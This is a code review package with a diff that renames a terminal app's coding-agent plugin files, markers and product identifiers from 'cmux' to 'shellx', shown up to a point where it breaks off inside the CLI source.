@@ -1,0 +1,2807 @@
+# Review package: 12bfe7a800..HEAD
+
+## Commits
+f02042729f test(shellx): guard agent integration names, the cua link policy and fish CLI lookup
+63d77980e4 fix(shellx): an unidentified duplicate launch is left running, never force-terminated
+1549a0294a fix(shellx): fish fallback runs shellx; system.identify names the product shellx
+936a963ebc fix(shellx): Computer Use skill links into a cmux bundle are cmux's, never ShellX's
+e46716cf66 fix(shellx): agent plugin and extension files are ShellX's own, never cmux's
+
+## Files changed
+ CLI/CLIVersionSkew.swift                           |  5 +-
+ CLI/CMUXCLI+AgentHookCatalog.swift                 | 10 ++--
+ CLI/CMUXCLI+AmpExtension.swift                     |  4 +-
+ CLI/CMUXCLI+AmpExtensionSourcePart1.swift          |  2 +-
+ CLI/CMUXCLI+CampfireExtension.swift                |  6 +-
+ CLI/CMUXCLI+OmpExtension.swift                     |  6 +-
+ CLI/CMUXCLI+PiExtension.swift                      |  6 +-
+ CLI/CMUXCLI+PiExtensionSourceMetadata.swift        |  2 +-
+ CLI/CMUXCLI+PiExtensionSourcePart1.swift           |  2 +-
+ CLI/cmux.swift                                     | 64 +++++++++++-----------
+ .../SingleInstanceConflictPolicy.swift             |  8 ++-
+ .../SingleInstance/OlderShellXConflictTests.swift  |  8 ++-
+ Resources/bin/shellx-pi-wrapper                    | 10 ++--
+ Resources/opencode-plugin.js                       |  8 +--
+ Resources/opencode-tui-plugin.js                   |  4 +-
+ Resources/shell-integration/fish/config.fish       |  2 +-
+ Sources/AppDelegate.swift                          |  5 +-
+ Sources/TerminalController.swift                   |  2 +-
+ .../CLIClaudeHookTimeoutRegressionTests.swift      | 10 ++--
+ cmuxCLITests/CLIVersionSkewErrorTests.swift        |  8 +--
+ cmuxTests/CLIGenericHookPersistenceTests.swift     |  6 +-
+ cmuxTests/CLIVersionSkewMessageTests.swift         | 16 +++---
+ cmuxTests/OpenCodeHookRegressionTests.swift        | 28 +++++-----
+ skills/cmux-cua/link-policy.sh                     | 17 +++---
+ tests/claude_teams_test_utils.py                   |  2 +-
+ tests/test_amp_extension_install.py                |  4 +-
+ tests/test_campfire_extension_install.py           |  6 +-
+ tests/test_claude_wrapper_computer_use_skill.py    | 36 +++++++++++-
+ tests/test_cli_omo_shadow_config_mirror.py         |  6 +-
+ tests/test_codex_wrapper_computer_use_mcp.py       |  4 +-
+ tests/test_omp_extension_install.py                | 18 +++---
+ tests/test_omp_subagent_lifecycle.py               |  2 +-
+ tests/test_opencode_plugin_install.py              | 42 +++++++-------
+ tests/test_opencode_server_entry.py                | 12 ++--
+ tests/test_opencode_v2_tui_bridge.py               |  2 +-
+ tests/test_pi_extension_dispatch.py                | 16 +++---
+ tests/test_pi_extension_install.py                 | 12 ++--
+ tests/test_pi_wrapper.py                           | 16 +++---
+ tests/test_shellx_coexistence.py                   | 26 ++++++++-
+ 39 files changed, 254 insertions(+), 189 deletions(-)
+
+## Diff
+diff --git a/CLI/CLIVersionSkew.swift b/CLI/CLIVersionSkew.swift
+index 274d604959..b6cefd8d38 100644
+--- a/CLI/CLIVersionSkew.swift
++++ b/CLI/CLIVersionSkew.swift
+@@ -8,21 +8,21 @@ import Foundation
+ /// to a different cmux app (cmux-next answers with its own method set). A bare
+ /// `method_not_found: Unknown method` hides all of that. Callers that probe
+ /// for optional methods catch `method_not_found` before it gets here, so this
+ /// runs only for errors the CLI is about to print.
+ ///
+ /// This file has no socket dependency so unit tests can compile it; the
+ /// socket round trip lives in `CLIVersionSkew+Diagnose.swift`.
+ enum CLIVersionSkew {
+     /// What the connected app says about itself in `system.identify`.
+     struct Peer: Equatable {
+-        /// `app` from `system.identify` (`cmux`, `cmux-next`); nil from apps
++        /// `app` from `system.identify` (`shellx`, `cmux`, `cmux-next`); nil from apps
+         /// that predate the field.
+         var app: String?
+         var version: String?
+         var build: String?
+         var cliPath: String?
+         /// Methods the app lists, when it lists them.
+         var methods: [String]?
+ 
+         init(identify: [String: Any]) {
+             app = Self.text(identify["app"])
+@@ -41,21 +41,22 @@ enum CLIVersionSkew {
+         }
+ 
+         private static func text(_ value: Any?) -> String? {
+             guard let string = value as? String else { return nil }
+             let trimmed = CLITerminalText.printable(string).trimmingCharacters(in: .whitespaces)
+             return trimmed.isEmpty ? nil : trimmed
+         }
+     }
+ 
+     /// The product name this CLI belongs to, as `system.identify` reports it.
+-    static let cliProduct = "cmux"
++    /// ShellX's own product name, so a socket answered by cmux reads as another product.
++    static let cliProduct = "shellx"
+ 
+     /// The user-facing explanation, or nil when the original error already
+     /// says enough: the app is the same build as this CLI, lists the method,
+     /// or this CLI cannot read its own version. `bundle` selects the string
+     /// table (nil is the main bundle); tests pass one without a table to get
+     /// the English source text on any system language.
+     static func message(
+         method: String,
+         socketPath: String,
+         cliVersion: String,
+diff --git a/CLI/CMUXCLI+AgentHookCatalog.swift b/CLI/CMUXCLI+AgentHookCatalog.swift
+index f39e5dfe06..e8c62f3b95 100644
+--- a/CLI/CMUXCLI+AgentHookCatalog.swift
++++ b/CLI/CMUXCLI+AgentHookCatalog.swift
+@@ -40,54 +40,54 @@ extension CMUXCLI {
+                 .init(agentEvent: "Notification", cmuxSubcommand: "notification"),
+                 .init(agentEvent: "SessionEnd", cmuxSubcommand: "session-end"),
+             ],
+             dispatch: .pinned(marker: "shellx-grok-hook-v2"),
+             publishesStopNotification: false,
+             sessionEndIsTurnBoundary: true,
+             feedHookEvents: ["PreToolUse"]
+         ),
+         AgentHookDef(
+             name: "opencode", displayName: "OpenCode", statusKey: "opencode",
+-            configDir: ".config/opencode", configFile: "plugins/cmux-session.js", configDirEnvOverride: "OPENCODE_CONFIG_DIR",
++            configDir: ".config/opencode", configFile: "plugins/shellx-session.js", configDirEnvOverride: "OPENCODE_CONFIG_DIR",
+             configDirResolver: { OpenCodePaths(environment: ProcessInfo.processInfo.environment).configDirectory.path },
+             sessionStoreSuffix: "opencode", disableEnvVar: "CMUX_OPENCODE_HOOKS_DISABLED",
+             hookMarker: "shellx hooks opencode", format: .flat,
+             events: []
+         ),
+         AgentHookDef(
+             name: "pi", displayName: "Pi", statusKey: "pi",
+-            configDir: ".pi/agent", configFile: "extensions/cmux-session.ts", configDirEnvOverride: "PI_CODING_AGENT_DIR",
++            configDir: ".pi/agent", configFile: "extensions/shellx-session.ts", configDirEnvOverride: "PI_CODING_AGENT_DIR",
+             sessionStoreSuffix: "pi", disableEnvVar: "CMUX_PI_HOOKS_DISABLED",
+             hookMarker: "shellx hooks pi", format: .flat,
+             events: []
+         ),
+         AgentHookDef(
+             name: "omp", displayName: "OMP", statusKey: "omp",
+-            configDir: ".omp/agent", configFile: "extensions/cmux-omp-session.ts",
++            configDir: ".omp/agent", configFile: "extensions/shellx-omp-session.ts",
+             createConfigDirIfMissing: true,
+             configDirResolver: { CMUXCLI.resolvedOmpAgentDirectory().path },
+             sessionStoreSuffix: "omp", disableEnvVar: "CMUX_OMP_HOOKS_DISABLED",
+             hookMarker: "shellx hooks omp", format: .flat,
+             events: []
+         ),
+         AgentHookDef(
+             name: "campfire", displayName: "Campfire", statusKey: "campfire",
+-            configDir: ".campfire/agent", configFile: "extensions/cmux-campfire-session.ts",
++            configDir: ".campfire/agent", configFile: "extensions/shellx-campfire-session.ts",
+             createConfigDirIfMissing: true,
+             configDirResolver: { CMUXCLI.resolvedCampfireAgentDirectory().path },
+             sessionStoreSuffix: "campfire", disableEnvVar: "CMUX_CAMPFIRE_HOOKS_DISABLED",
+             hookMarker: "shellx hooks campfire", format: .flat,
+             events: []
+         ),
+         AgentHookDef(
+             name: "amp", displayName: "Amp", statusKey: "amp",
+-            configDir: ".config/amp", configFile: "plugins/cmux-session.ts",
++            configDir: ".config/amp", configFile: "plugins/shellx-session.ts",
+             sessionStoreSuffix: "amp", disableEnvVar: "CMUX_AMP_HOOKS_DISABLED",
+             hookMarker: "shellx hooks amp", format: .flat,
+             events: []
+         ),
+         AgentHookDef(
+             name: "cursor", displayName: "Cursor", statusKey: "cursor",
+             configDir: ".cursor", configFile: "hooks.json", binaryName: "cursor-agent",
+             sessionStoreSuffix: "cursor", disableEnvVar: "CMUX_CURSOR_HOOKS_DISABLED",
+             hookMarker: "shellx hooks cursor", format: .flat,
+             events: [
+diff --git a/CLI/CMUXCLI+AmpExtension.swift b/CLI/CMUXCLI+AmpExtension.swift
+index 48fb837b0d..c1bc48f483 100644
+--- a/CLI/CMUXCLI+AmpExtension.swift
++++ b/CLI/CMUXCLI+AmpExtension.swift
+@@ -1,15 +1,15 @@
+ import Foundation
+ 
+ extension CMUXCLI {
+-    static let ampExtensionMarker = "cmux-amp-session-extension-marker"
+-    static let ampExtensionFilename = "cmux-session.ts"
++    static let ampExtensionMarker = "shellx-amp-session-extension-marker"
++    static let ampExtensionFilename = "shellx-session.ts"
+     static let ampExtensionSource =
+         ampExtensionPrelude
+         + ampExtensionReconciliation
+         + ampExtensionHandlers
+ 
+     /// Resolves the private semantic status values emitted by the Amp plugin
+     /// in the host locale before forwarding them to the sidebar socket.
+     static func localizedAmpStatusArguments(_ arguments: [String]) -> [String] {
+         guard arguments.count >= 2,
+               arguments[0] == "amp" else {
+diff --git a/CLI/CMUXCLI+AmpExtensionSourcePart1.swift b/CLI/CMUXCLI+AmpExtensionSourcePart1.swift
+index e3b35c5a9c..686b68d18f 100644
+--- a/CLI/CMUXCLI+AmpExtensionSourcePart1.swift
++++ b/CLI/CMUXCLI+AmpExtensionSourcePart1.swift
+@@ -1,13 +1,13 @@
+ extension CMUXCLI {
+     static let ampExtensionPrelude = #"""
+-// cmux-amp-session-extension-marker v3
++// shellx-amp-session-extension-marker v3
+ // Bridges Amp thread lifecycle, title, and authoritative state into cmux.
+ // Installed and refreshed automatically by cmux's managed Amp wrapper.
+ // DO NOT EDIT MANUALLY. cmux upgrades this file in place.
+ // @i-know-the-amp-plugin-api-is-wip-and-very-experimental-right-now
+ 
+ import { spawn } from "node:child_process";
+ import * as fs from "node:fs";
+ import * as path from "node:path";
+ import type {
+   PluginAPI,
+diff --git a/CLI/CMUXCLI+CampfireExtension.swift b/CLI/CMUXCLI+CampfireExtension.swift
+index 407633a74c..060062f425 100644
+--- a/CLI/CMUXCLI+CampfireExtension.swift
++++ b/CLI/CMUXCLI+CampfireExtension.swift
+@@ -1,17 +1,17 @@
+ import Foundation
+ 
+ extension CMUXCLI {
+-    static let campfireExtensionMarker = "cmux-campfire-session-extension-marker"
+-    static let campfireExtensionFilename = "cmux-campfire-session.ts"
++    static let campfireExtensionMarker = "shellx-campfire-session-extension-marker"
++    static let campfireExtensionFilename = "shellx-campfire-session.ts"
+     static let campfireExtensionSource = #"""
+-// cmux-campfire-session-extension-marker v1
++// shellx-campfire-session-extension-marker v1
+ // Bridges Campfire session lifecycle events into cmux's restorable session store,
+ // and Campfire's collaborative moments (join requests, capability asks) into cmux
+ // notifications. Installed by `cmux hooks campfire install` or `cmux hooks setup`.
+ // DO NOT EDIT MANUALLY. cmux upgrades this file in place.
+ 
+ import { spawn } from "node:child_process";
+ import * as fs from "node:fs";
+ import * as path from "node:path";
+ import type { AgentEndEvent, ExtensionAPI, ExtensionContext } from "@earendil-works/pi-coding-agent";
+ 
+diff --git a/CLI/CMUXCLI+OmpExtension.swift b/CLI/CMUXCLI+OmpExtension.swift
+index 1485162c01..b74866ab6d 100644
+--- a/CLI/CMUXCLI+OmpExtension.swift
++++ b/CLI/CMUXCLI+OmpExtension.swift
+@@ -1,17 +1,17 @@
+ import Foundation
+ 
+ extension CMUXCLI {
+-    private static let ompExtensionMarker = "cmux-omp-session-extension-marker"
+-    private static let ompExtensionFilename = "cmux-omp-session.ts"
++    private static let ompExtensionMarker = "shellx-omp-session-extension-marker"
++    private static let ompExtensionFilename = "shellx-omp-session.ts"
+     private static let ompExtensionSource = #"""
+-// cmux-omp-session-extension-marker v4
++// shellx-omp-session-extension-marker v4
+ // Bridges OMP session lifecycle events into cmux's restorable session store.
+ // Installed by `cmux hooks omp install` or `cmux hooks setup`.
+ // DO NOT EDIT MANUALLY. cmux upgrades this file in place.
+ 
+ import { spawn } from "node:child_process";
+ import * as fs from "node:fs";
+ import * as path from "node:path";
+ import type { AgentEndEvent, ExtensionAPI, ExtensionContext } from "@oh-my-pi/pi-coding-agent";
+ 
+ function firstString(...values: unknown[]): string | null {
+diff --git a/CLI/CMUXCLI+PiExtension.swift b/CLI/CMUXCLI+PiExtension.swift
+index c52cc9abfa..2c4f1a40ae 100644
+--- a/CLI/CMUXCLI+PiExtension.swift
++++ b/CLI/CMUXCLI+PiExtension.swift
+@@ -1,16 +1,16 @@
+ import Foundation
+ import Darwin
+ 
+ extension CMUXCLI {
+-    private static let piExtensionMarker = "cmux-pi-session-extension-marker"
+-    private static let piExtensionFilename = "cmux-session.ts"
++    private static let piExtensionMarker = "shellx-pi-session-extension-marker"
++    private static let piExtensionFilename = "shellx-session.ts"
+ 
+     private func piExtensionURL(for def: AgentHookDef) -> URL {
+         URL(fileURLWithPath: def.resolvedConfigDir(), isDirectory: true)
+             .appendingPathComponent("extensions", isDirectory: true)
+             .appendingPathComponent(Self.piExtensionFilename, isDirectory: false)
+     }
+ 
+     private func existingPiExtensionContents(at url: URL, fileManager: FileManager = .default) throws -> String {
+         guard fileManager.fileExists(atPath: url.path) else { return "" }
+         do {
+@@ -32,21 +32,21 @@ extension CMUXCLI {
+         at extensionURL: URL,
+         createParentDirectory: Bool,
+         acquireNonBlocking: Bool = false,
+         fileManager: FileManager = .default,
+         _ operation: () throws -> T
+     ) throws -> T? {
+         let directoryURL = extensionURL.deletingLastPathComponent()
+         if createParentDirectory {
+             try fileManager.createDirectory(at: directoryURL, withIntermediateDirectories: true)
+         }
+-        let lockURL = directoryURL.appendingPathComponent(".cmux-session.lock", isDirectory: false)
++        let lockURL = directoryURL.appendingPathComponent(".shellx-session.lock", isDirectory: false)
+         let descriptor = Darwin.open(
+             lockURL.path,
+             O_CREAT | O_RDWR | O_CLOEXEC | O_NOFOLLOW,
+             mode_t(S_IRUSR | S_IWUSR)
+         )
+         guard descriptor >= 0 else {
+             throw piExtensionReadError(at: extensionURL)
+         }
+         defer { Darwin.close(descriptor) }
+         var metadata = stat()
+diff --git a/CLI/CMUXCLI+PiExtensionSourceMetadata.swift b/CLI/CMUXCLI+PiExtensionSourceMetadata.swift
+index 9396fa4b27..cdd638a99a 100644
+--- a/CLI/CMUXCLI+PiExtensionSourceMetadata.swift
++++ b/CLI/CMUXCLI+PiExtensionSourceMetadata.swift
+@@ -138,21 +138,21 @@ function installPiUIDialogHooks(
+   sessionStates: Map<string, SessionState>,
+   context: ExtensionContext,
+   enqueueLifecycleTask: (
+     sessionId: string,
+     context: PiExtensionContextSnapshot,
+     operation: () => Promise<unknown> | unknown,
+   ) => Promise<void>,
+ ): (() => void) | undefined {
+   if (process.env.CMUX_PI_HOOKS_DISABLED === "1" || !context.hasUI) return undefined;
+   const ui = context.ui as any;
+-  const patchKey = Symbol.for("cmux.pi.cmux-dialog-hooks");
++  const patchKey = Symbol.for("shellx.pi.dialog-hooks");
+   if (ui[patchKey]) return undefined;
+ 
+   const originalConfirm = ui.confirm.bind(ui);
+   const originalSelect = ui.select.bind(ui);
+   const originalInput = ui.input.bind(ui);
+   const snapshot = () => snapshotContext(context);
+   const signal = (_message: string): PiUIDialogLifecycle | undefined => {
+     const current = snapshot();
+     const sessionId = current.sessionId;
+     if (!sessionId) return undefined;
+diff --git a/CLI/CMUXCLI+PiExtensionSourcePart1.swift b/CLI/CMUXCLI+PiExtensionSourcePart1.swift
+index 0385c36d04..2950634aec 100644
+--- a/CLI/CMUXCLI+PiExtensionSourcePart1.swift
++++ b/CLI/CMUXCLI+PiExtensionSourcePart1.swift
+@@ -1,13 +1,13 @@
+ extension CMUXCLI {
+     static let piExtensionSourcePart1 = #"""
+-// cmux-pi-session-extension-marker v4
++// shellx-pi-session-extension-marker v4
+ // Bridges Pi session lifecycle, tool telemetry, notifications, and resume bindings into cmux.
+ // Installed by `cmux hooks pi install` or `cmux hooks setup`.
+ // DO NOT EDIT MANUALLY. cmux upgrades this file in place.
+ 
+ import { Buffer } from "node:buffer";
+ import { spawn } from "node:child_process";
+ import { randomUUID } from "node:crypto";
+ import * as fs from "node:fs";
+ import * as path from "node:path";
+ import type { ExtensionAPI, ExtensionContext } from "@earendil-works/pi-coding-agent";
+diff --git a/CLI/cmux.swift b/CLI/cmux.swift
+index 639ab40301..5a31535720 100644
+--- a/CLI/cmux.swift
++++ b/CLI/cmux.swift
+@@ -21614,26 +21614,26 @@ struct CMUXCLI {
+ 
+             Hook targets:
+               setup              Install hooks for all supported agents on PATH
+               uninstall          Remove hooks for all supported agents
+               <agent> install    Install one agent integration
+               <agent> uninstall  Remove one agent integration
+               <agent> <event>    Internal hook entrypoint used by generated configs
+               feed               Internal Feed decision bridge
+ 
+             Generated files:
+-              ~/.config/opencode/plugins/cmux-session.js
+-              ~/.config/opencode/plugins/cmux-feed.js
+-              ~/.pi/agent/extensions/cmux-session.ts
+-              ~/.omp/agent/extensions/cmux-omp-session.ts
+-              ~/.campfire/agent/extensions/cmux-campfire-session.ts
+-              ~/.config/amp/plugins/cmux-session.ts
++              ~/.config/opencode/plugins/shellx-session.js
++              ~/.config/opencode/plugins/shellx-feed.js
++              ~/.pi/agent/extensions/shellx-session.ts
++              ~/.omp/agent/extensions/shellx-omp-session.ts
++              ~/.campfire/agent/extensions/shellx-campfire-session.ts
++              ~/.config/amp/plugins/shellx-session.ts
+               ~/.kiro/agents/cmux.json
+               See docs/agent-hooks.md for the full integration matrix.
+ 
+             Examples:
+               cmux hooks setup
+               cmux hooks setup --agent codex
+               cmux hooks setup rovo
+               cmux hooks setup omp
+               cmux hooks uninstall rovo
+               cmux hooks codex install
+@@ -28809,33 +28809,33 @@ struct CMUXCLI {
+                     return
+                 } catch {}
+             }
+             try? fileManager.removeItem(at: tempURL)
+             throw error
+         }
+     }
+ 
+     private static let omoPluginName = "oh-my-openagent"
+     private static let legacyOmoPluginName = "oh-my-opencode"
+-    private static let openCodeSessionPluginConfigSpec = "./plugins/cmux"
+-    private static let openCodeTUIPluginDirectoryName = "cmux"
++    private static let openCodeSessionPluginConfigSpec = "./plugins/shellx"
++    private static let openCodeTUIPluginDirectoryName = "shellx"
+     private static let openCodeTUIPluginPackageSource = #"""
+ {
+-  "name": "cmux-opencode-plugin",
++  "name": "shellx-opencode-plugin",
+   "type": "module",
+   "exports": {
+     ".": "./index.js",
+     "./tui": "./tui.js"
+   }
+ }
+ """#
+-    private static let openCodeTUIPluginOwnershipMarker = "cmux-opencode-tui-plugin-ownership-marker v2"
++    private static let openCodeTUIPluginOwnershipMarker = "shellx-opencode-tui-plugin-ownership-marker v2"
+     func resolveExecutableInPath(_ name: String, searchPath: String? = nil) -> String? {
+         let entries = (searchPath ?? ProcessInfo.processInfo.environment["PATH"])?
+             .split(separator: ":")
+             .map(String.init) ?? []
+         for entry in entries where !entry.isEmpty {
+             let candidate = URL(fileURLWithPath: entry, isDirectory: true)
+                 .appendingPathComponent(name, isDirectory: false)
+                 .path
+             // `isExecutableFile(atPath:)` is true for directories, so a directory named
+             // like the binary would otherwise shadow the real executable (#8743).
+@@ -36469,33 +36469,33 @@ struct CMUXCLI {
+         case "PreToolUse", "PostToolUse":
+             return [
+                 "matcher": "*",
+                 "hooks": [hook],
+             ]
+         default:
+             return hook
+         }
+     }
+ 
+-    private static let openCodeSessionPluginMarker = "cmux-opencode-session-plugin-marker"
+-    private static let openCodeSessionPluginFilename = "cmux-session.js"
++    private static let openCodeSessionPluginMarker = "shellx-opencode-session-plugin-marker"
++    private static let openCodeSessionPluginFilename = "shellx-session.js"
+     private static let openCodeSessionPluginSource = #"""
+-// cmux-opencode-session-plugin-marker v1
++// shellx-opencode-session-plugin-marker v1
+ // Bridges OpenCode session lifecycle events into cmux's restorable session store.
+ // Installed by `cmux hooks opencode install` or `cmux hooks setup`.
+ // DO NOT EDIT MANUALLY. cmux upgrades this file in place.
+ 
+ import { spawn } from "node:child_process";
+ import * as fs from "node:fs";
+ import * as path from "node:path";
+ 
+-const CMUX_PLUGIN_INSTALLED_KEY = Symbol.for("cmux.session.restore.plugin.installed");
++const CMUX_PLUGIN_INSTALLED_KEY = Symbol.for("shellx.session.restore.plugin.installed");
+ const MAX_TRACKED_SESSIONS = 100;
+ const messageRoles = new Map();
+ const sessions = new Map();
+ 
+ function firstString(...values) {
+   for (const value of values) {
+     if (typeof value === "string" && value.trim().length > 0) return value.trim();
+   }
+   return null;
+ }
+@@ -36865,24 +36865,24 @@ export const CMUXSessionRestore = async (ctx) => {
+   return createCMUXSessionRestore(ctx);
+ };
+ 
+ // Released OpenCode calls `server(ctx)` inside each TUI process with the
+ // project server context. Old V2 snapshots called it from a shared service
+ // without that context, so only subscribe when it is present.
+ function isTUIProcessServerContext(ctx) {
+   return Boolean(ctx && typeof ctx === "object" && ctx.client && ctx.serverUrl && ctx.directory);
+ }
+ 
+-const CMUX_SESSION_SERVER_SCOPES_KEY = Symbol.for("cmux.session.server.scopes");
++const CMUX_SESSION_SERVER_SCOPES_KEY = Symbol.for("shellx.session.server.scopes");
+ 
+ export default {
+-  id: "cmux.session",
++  id: "shellx.session",
+   async server(ctx) {
+     if (!isTUIProcessServerContext(ctx)) return {};
+     // Every loader in one plugin scope receives the same ctx. OpenCode keeps
+     // one scope per directory and disposes a scope's hooks when it tears it
+     // down, after which this scope must not send hooks.
+     const scopes = globalThis[CMUX_SESSION_SERVER_SCOPES_KEY] ||= new WeakSet();
+     if (scopes.has(ctx)) return {};
+     scopes.add(ctx);
+     globalThis[CMUX_PLUGIN_INSTALLED_KEY] = true;
+     const hooks = await createCMUXSessionRestore(ctx);
+@@ -36907,83 +36907,83 @@ export default {
+     }
+ 
+     private func bundledOpenCodeTUIPluginSource() throws -> String {
+         for url in openCodePluginResourceCandidates(filename: "opencode-tui-plugin.js") {
+             if let source = try? String(contentsOf: url, encoding: .utf8) { return source }
+         }
+         throw CLIError(message: String(localized: "cli.hooks.error.bundledPluginUnavailable", defaultValue: "cmux could not install the selected agent integration. Reinstall cmux or run the hook installation command again."))
+     }
+ 
+     private func openCodeTUIPluginOwnershipURL(in configDir: URL) -> URL {
+-        openCodeTUIPluginDirectory(in: configDir).appendingPathComponent(".cmux-owned", isDirectory: false)
++        openCodeTUIPluginDirectory(in: configDir).appendingPathComponent(".shellx-owned", isDirectory: false)
+     }
+ 
+     private func openCodeTUIPluginPathIsSymlink(_ url: URL) -> Bool {
+         (try? FileManager.default.destinationOfSymbolicLink(atPath: url.path)) != nil
+     }
+ 
+     private func openCodeTUIPluginDirectoryIsSymlink(in configDir: URL) -> Bool {
+         openCodeTUIPluginPathIsSymlink(openCodeTUIPluginDirectory(in: configDir))
+     }
+ 
+     private func openCodeTUIPluginFileIsOwned(_ name: String, in directory: URL) -> Bool {
+         let url = directory.appendingPathComponent(name, isDirectory: false)
+         guard !openCodeTUIPluginPathIsSymlink(url) else { return false }
+         guard let contents = try? String(contentsOf: url, encoding: .utf8) else { return false }
+         switch name {
+         case "package.json":
+-            return contents.contains("\"name\": \"cmux-opencode-plugin\"")
++            return contents.contains("\"name\": \"shellx-opencode-plugin\"")
+         case "index.js":
+-            return contents.contains("cmux-opencode-tui-plugin-server-marker")
++            return contents.contains("shellx-opencode-tui-plugin-server-marker")
+         case "tui.js":
+-            return contents.contains("cmux-opencode-tui-plugin-marker")
+-        case ".cmux-owned":
++            return contents.contains("shellx-opencode-tui-plugin-marker")
++        case ".shellx-owned":
+             return contents.contains(Self.openCodeTUIPluginOwnershipMarker)
+         default:
+             return false
+         }
+     }
+ 
+     private func validateOpenCodeTUIPluginDirectory(in configDir: URL) throws {
+         let directory = openCodeTUIPluginDirectory(in: configDir)
+         let fileManager = FileManager.default
+         if openCodeTUIPluginDirectoryIsSymlink(in: configDir) {
+             throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+         }
+         if fileManager.fileExists(atPath: directory.path) {
+-            for name in [".cmux-owned", "package.json", "index.js", "tui.js"] {
++            for name in [".shellx-owned", "package.json", "index.js", "tui.js"] {
+                 if openCodeTUIPluginPathIsSymlink(directory.appendingPathComponent(name, isDirectory: false)) {
+                     throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+                 }
+             }
+-            let marked = openCodeTUIPluginFileIsOwned(".cmux-owned", in: directory)
++            let marked = openCodeTUIPluginFileIsOwned(".shellx-owned", in: directory)
+                 || openCodeTUIPluginFileIsOwned("index.js", in: directory)
+             guard marked else {
+                 throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+             }
+             for name in ["package.json", "index.js", "tui.js"] where fileManager.fileExists(atPath: directory.appendingPathComponent(name).path) {
+                 guard openCodeTUIPluginFileIsOwned(name, in: directory) else {
+                     throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+                 }
+             }
+         }
+     }
+ 
+     private func writeOpenCodeTUIPlugin(in configDir: URL) throws {
+         let directory = openCodeTUIPluginDirectory(in: configDir)
+         let fileManager = FileManager.default
+         try validateOpenCodeTUIPluginDirectory(in: configDir)
+         try fileManager.createDirectory(at: directory, withIntermediateDirectories: true)
+         try Self.openCodeTUIPluginPackageSource.write(to: directory.appendingPathComponent("package.json"), atomically: true, encoding: .utf8)
+         let feedSource = try bundledOpenCodePluginSource()
+-        let serverSource = "// cmux-opencode-tui-plugin-server-marker v2\n"
+-            + feedSource.replacingOccurrences(of: "id: \"cmux.feed\"", with: "id: \"cmux.server\"")
++        let serverSource = "// shellx-opencode-tui-plugin-server-marker v2\n"
++            + feedSource.replacingOccurrences(of: "id: \"shellx.feed\"", with: "id: \"cmux.server\"")
+         try serverSource.write(to: directory.appendingPathComponent("index.js"), atomically: true, encoding: .utf8)
+         try bundledOpenCodeTUIPluginSource().write(to: directory.appendingPathComponent("tui.js"), atomically: true, encoding: .utf8)
+         try (Self.openCodeTUIPluginOwnershipMarker + "\n").write(to: openCodeTUIPluginOwnershipURL(in: configDir), atomically: true, encoding: .utf8)
+     }
+ 
+     private func openCodeSessionPluginURL(for def: AgentHookDef) -> URL {
+         URL(fileURLWithPath: def.resolvedConfigDir(), isDirectory: true)
+             .appendingPathComponent("plugins", isDirectory: true)
+             .appendingPathComponent(Self.openCodeSessionPluginFilename, isDirectory: false)
+     }
+@@ -37123,21 +37123,21 @@ export default {
+     }
+ 
+     private static func openCodePluginListRemovingSessionPlugin(_ plugins: [Any]) -> [Any] {
+         plugins.filter { entry in
+             guard let value = (entry as? String) ?? ((entry as? [Any])?.first as? String) else {
+                 return true
+             }
+             return value != Self.openCodeSessionPluginConfigSpec
+                 && value != "./plugins"
+                 && value != "./plugins/\(Self.openCodeTUIPluginDirectoryName)"
+-                && value != "cmux-session"
++                && value != "shellx-session"
+                 && value != "./plugins/\(Self.openCodeSessionPluginFilename)"
+                 && !value.hasSuffix("/plugins/\(Self.openCodeSessionPluginFilename)")
+                 && !value.hasSuffix("/\(Self.openCodeSessionPluginFilename)")
+         }
+     }
+ 
+     private func updateOpenCodePluginRegistration(configDir: URL, shouldInstall: Bool) throws -> Bool {
+         let configURL = configDir.appendingPathComponent("opencode.json", isDirectory: false); let existingData = try? Data(contentsOf: configURL)
+         var config: [String: Any]
+         if let data = existingData {
+@@ -37194,35 +37194,35 @@ export default {
+         print("OpenCode hooks installed at \(pluginURL.path)")
+     }
+ 
+     private func removeOpenCodeTUIPlugin(in configDir: URL) throws {
+         let directory = openCodeTUIPluginDirectory(in: configDir)
+         let fileManager = FileManager.default
+         if openCodeTUIPluginDirectoryIsSymlink(in: configDir) {
+             throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+         }
+         let markerURL = openCodeTUIPluginOwnershipURL(in: configDir)
+-        let markerOwned = openCodeTUIPluginFileIsOwned(".cmux-owned", in: directory)
++        let markerOwned = openCodeTUIPluginFileIsOwned(".shellx-owned", in: directory)
+         let legacyOwned = openCodeTUIPluginFileIsOwned("index.js", in: directory)
+         guard markerOwned || legacyOwned else { return }
+         if legacyOwned && !markerOwned {
+             guard !openCodeTUIPluginPathIsSymlink(markerURL) else {
+                 throw CLIError(message: String(localized: "cli.hooks.error.pluginDirectoryOwned", defaultValue: "cmux could not install the selected agent integration because its plugin directory is already in use."))
+             }
+             try (Self.openCodeTUIPluginOwnershipMarker + "\n").write(to: markerURL, atomically: true, encoding: .utf8)
+         }
+         for name in ["package.json", "index.js", "tui.js"] where openCodeTUIPluginFileIsOwned(name, in: directory) {
+             let url = directory.appendingPathComponent(name, isDirectory: false)
+             if fileManager.fileExists(atPath: url.path) { try fileManager.removeItem(at: url) }
+         }
+         let remaining = try fileManager.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil)
+-        if remaining.count == 1, openCodeTUIPluginFileIsOwned(".cmux-owned", in: directory) {
++        if remaining.count == 1, openCodeTUIPluginFileIsOwned(".shellx-owned", in: directory) {
+             try fileManager.removeItem(at: markerURL)
+         }
+         if (try? fileManager.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil))?.isEmpty == true {
+             try fileManager.removeItem(at: directory)
+         }
+     }
+ 
+     private func uninstallOpenCodePluginHooks(_ def: AgentHookDef) throws {
+         let fm = FileManager.default
+         let pluginURL = openCodeSessionPluginURL(for: def)
+@@ -37252,21 +37252,21 @@ export default {
+     func readAgentHookConfig(filePath: String, displayName: String) throws -> String {
